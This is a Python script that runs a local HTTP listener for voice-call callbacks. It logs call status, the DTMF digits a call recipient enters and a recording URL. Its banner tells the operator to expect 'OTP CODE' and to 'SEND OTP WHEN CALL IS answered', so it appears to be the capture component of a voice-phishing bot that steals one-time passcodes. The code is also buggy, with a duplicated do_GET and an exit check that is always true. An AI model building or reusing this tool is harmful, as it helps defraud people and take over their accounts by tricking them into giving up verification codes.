import os
from func import main_menu
from urllib.parse import urlparse
import urllib.parse as urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer


class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        self._set_headers()

    def do_GET(self):
        imsi = urlparse.parse_qs(urlparse.urlparse(self.path, ).query).get('status', None)
        imsi2 = urlparse.parse_qs(urlparse.urlparse(self.path).query).get('dtmf', None)
        imsi3 = urlparse.parse_qs(urlparse.urlparse(self.path).query).get('recording_url', None)
        print(f'CallStatus:{imsi}')  # Prints None or the string value of imsi
        print(f'digits:{imsi2}')
        print(f'REC: {imsi3}')

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        return


def run(server_class=HTTPServer, handler_class=S, port=8000):
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(('localhost', 8000), handler_class)
    while True:
        print(
            "YOU will receve importaint info about call !!! \n LIKE  OTP CODE AND CALL STATUS \n SEND OTP WHEN CALL IS ['answered']")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            usr = input(" ARE YOU SURE YOU WANT TO EXIT. \n Y/N ")
            if usr == 'y' or 'Y':
                httpd.server_close()
                main_menu()
            else:
                if usr == 'N' or 'n':
                    os.system('clear')


run()
